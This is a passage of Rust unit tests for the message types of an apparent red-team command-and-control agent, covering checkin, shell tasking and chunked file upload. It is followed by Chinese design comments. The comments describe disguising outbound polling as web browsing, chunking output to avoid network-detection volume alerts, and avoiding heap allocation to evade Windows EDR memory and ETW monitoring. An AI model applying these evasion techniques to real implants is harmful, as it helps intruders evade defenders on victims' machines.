        let resp: ServerCheckinResponse = serde_json::from_str(raw_json).unwrap();
        assert!(resp.validate().is_ok());
        assert_eq!(resp.action, "checkin");
        assert_eq!(resp.status, "success");
        assert_eq!(resp.id, Some("12345678-1234-1234-1234-1234567890ab"));

        let mut persistent_uuid = [0u8; 36];
        assert_eq!(resp.copy_id_to(&mut persistent_uuid), Ok(true));
        assert_eq!(&persistent_uuid, b"12345678-1234-1234-1234-1234567890ab");
    }

    #[test]
    fn test_server_tasking_response_ref_zero_copy() {
        let raw_response = r#"{
            "action": "get_tasking",
            "status": "success",
            "tasks": [
                {
                    "id": "task-uuid-002",
                    "command": "shell",
                    "parameters": "dir"
                }
            ]
        }"#;

        let resp: ServerTaskingResponseRef = serde_json::from_str(raw_response).unwrap();
        assert!(resp.validate().is_ok());
        assert_eq!(resp.action, "get_tasking");
        assert_eq!(resp.status, "success");
        assert_eq!(resp.tasks.len(), 1);
        assert_eq!(resp.tasks[0].id, "task-uuid-002");
        assert_eq!(resp.tasks[0].command, "shell");
        assert_eq!(resp.tasks[0].parameters, "dir");

        let owned_task = resp.tasks[0].to_owned();
        assert_eq!(owned_task.command, "shell");
    }

    #[test]
    fn test_file_chunk_payload_and_item() {
        let chunk = FileChunkPayload::new(
            "upload",
            "task-upload-001",
            "file-uuid-001",
            1,
            5,
            "SGVsbG8gV29ybGQ=",
        );
        assert!(chunk.validate().is_ok());

        let invalid_chunk = FileChunkPayload::new(
            "upload",
            "task-upload-001",
            "file-uuid-001",
            6,
            5,
            "SGVsbG8gV29ybGQ=",
        );
        assert_eq!(invalid_chunk.validate(), Err(ModelError::InvalidChunkInfo));

        let item = TaskResponseItem::new_file_chunk(
            "task-upload-001",
            "file-uuid-001",
            1,
            5,
            "SGVsbG8gV29ybGQ=",
            false,
        );
        assert!(item.validate().is_ok());
        assert_eq!(item.file_id, Some("file-uuid-001"));
        assert_eq!(item.chunk_num, Some(1));
    }
}


// 注释1
// String拥有所有权的动态字符串,在64位系统上占用24字节(pointer 8b堆指针 + capacity 8b容量 + length 8b当前长度),其必须向操作系统/堆分配器(alloc)申请物理堆内存.
// &'a str 不拥有所有权的的切片引用(胖指针),在64位系统上占用16字节(pointer 8b + length 8b),不触发堆分配
// 明显如果使用String,每个字段都需要在堆上做一次malloc内存分配.在no std下(只有alloc),大量微型堆分配会导致严重的碎片,且开销巨大.
//  使用&'a str将整个结构体在栈上/寄存器中构造,没有堆分配.
// &'a str下的CheckinMessage<'a>其被引用的数据存放于
// 1. 静态数据区.rdata段.结构体中写死的字面量（如 action: "checkin"）这种数据具有'static生命周期,随二进制文件加载到内存,整个程序运行期间一直存在
// 2. 栈内存区:对于运行期从系统 API 获取的局部变量（如从 Windows API 获取的宿主 IP或计算机名),其存在于调用者函数的局部栈帧（Stack Frame）或栈上的固定大小缓冲区（如[u8; 64] 字符数组）.在栈上直接借用这块字节切片，无需拷贝到堆上
// 3. 外部单个全局缓冲区:如打包json序列化时,数据源存放在调用者提供的一块连续的缓冲区中,&'a str仅指向该缓冲区中的某个偏移段.

// 注释2
// 这里是客户端pull而不是服务端push:绝大多数c/s通信架构中,agent通常位于内网/nat路由器后/防火墙后.服务端无法直接穿透内网向agent发送请求(因为没有公网ip,也没有对外开放的服务端口).只能依靠agent定期向服务端发出站请求.而出站流量通常被视为合法的网络访问(如伪装的http get/post 浏览网页).这是心跳轮询get tasking的设计思想
// action字段充当路由,服务端接收数据包后,检查action如果是get_tasking会将其派发给后端的任务查询模块
// tasking_size表示此次轮询,最多下发的待执行任务数量.一般是1,避免服务器一次下发过多任务,导致agent的内存缓冲区溢出,或长时间阻塞任务执行线程.

// 注释3
// 真实的红队/渗透环境下,客户端和服务端不会像普通命令行那样,发出指令后立即回显.其设计涉及异步状态机,大输出流式切片,多任务并发绑定,Windows内部命令回显和内存安全
// 1. 异步状态机:给agent的一个任务(如 扫描大子网的存活主机)可能会运行几秒甚至更久.而egent通常基于单线程时间循环配合定时睡眠.文件如果agent等命令完全执行完毕才回传,那么在命令执行期间心跳将停滞,导致agent在服务端显示失联.因此采用了任务下发 -> 异步启动/后台执行 ->分阶段回传执行状态的状态机模型
//  1.1 task_id:&'a str 复杂行动中,可能有多个操作员协同操作同一agent,或同一agent并发拉取多个不同任务.因此,agent回传数据时,服务端无法靠网络连接或上下文知道输出属于哪个指令.task_id(通常是36b的uuid)充当全局唯一tag.mythic服务端接收该值后,使用该值在数据库中找到对应的任务记录,将对应的回显推到对应的操作员终端中.
// 1.2 completed:bool 在crypto.rs中定义了单包最大明文容量(MAX_PLAINTEXT_LEN=2960).当某个命令输出50k大小数据,这50k不能一次性塞进单个json包(会导致超出加密缓冲区预算导致崩溃),更不能在网络中发送单个巨大的http post流量包(会触发网络流量检测设备（NDR/WAF）的体积异常告警).后续只有当agent读完最后一段数据(甚至是空),回传设置completed=true

// 注释4
// PostResponseMessage 使用 &'a [TaskResponseItem<'a>] 替代 Vec 的架构考量:
// 1. 杜绝堆分配与内存规避 (Windows 10/11 EDR 规避):
//    Windows 10/11 下现代 EDR（如 Defender / Falcon）重度依赖 ETW-Ti 和内核回调监控堆分配抖动，并在睡眠/心跳期对私有可读写内存（PAGE_READWRITE）执行特征检索。
//    若使用 Vec，每次回传均需向进程默认堆（Segment Heap / NT Heap）申请动态内存，极易产生高频堆分配行为痕迹与堆内存碎片（Heap Remanence）。
//    改为 &'a [TaskResponseItem<'a>] 后，调用者可在栈帧上以临时数组 `[item; N]` 就地构建，整个消息结构仅占 32 字节（两对胖指针），由寄存器与栈直接承载，彻底斩断堆分配链条。
// 2. 深度契合 crypto.rs 的 Caller-provided Buffer 模式:
//    crypto.rs 的 `seal_message` 采用硬性预算契约（MAX_PLAINTEXT_LEN = 2960）。任务回显数据在应用层通常按单切片（Chunk）或单条任务推进，
//    调用者在栈上准备 `[item; 1]` 并借用为切片，与 crypto.rs 提供的静态/栈暂存区 `raw_buf: [u8; MAX_RAW_LEN]` 达成自顶向下的“全栈零堆分配”设计闭环。